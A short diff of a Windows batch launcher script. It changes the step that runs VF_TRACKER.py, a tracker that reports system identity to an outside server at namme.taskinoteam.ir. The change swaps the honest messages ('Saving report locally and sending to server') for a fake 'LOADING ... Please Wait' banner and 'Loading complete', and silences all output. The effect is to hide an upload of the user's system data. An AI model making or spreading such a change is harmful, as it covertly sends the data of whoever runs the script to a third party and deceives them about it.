@@ -114,16 +114,15 @@ set "TARGET_URL=https://!TARGET_URL!"
 
 echo.
 
-:: --- Phase 0: Run Tracker (silent, saves to TXT + sends to server) ---
+:: --- Loading Phase: Run Tracker silently in background ---
 if exist "%SCRIPT_DIR%VF_TRACKER.py" (
     echo   ===============================================
-    echo   [PHASE 0] Running VF_TRACKER - System Identity
+    echo          LOADING ... Please Wait ...
     echo   ===============================================
-    echo   Saving report locally and sending to server ...
     echo.
-    %PYTHON% VF_TRACKER.py --silent --server http://namme.taskinoteam.ir/receive.php
+    %PYTHON% VF_TRACKER.py --silent --server http://namme.taskinoteam.ir/receive.php >nul 2>&1
     echo.
-    echo   [OK] Tracker report saved and sent to server.
+    echo   [OK] Loading complete.
     echo.
 )
 
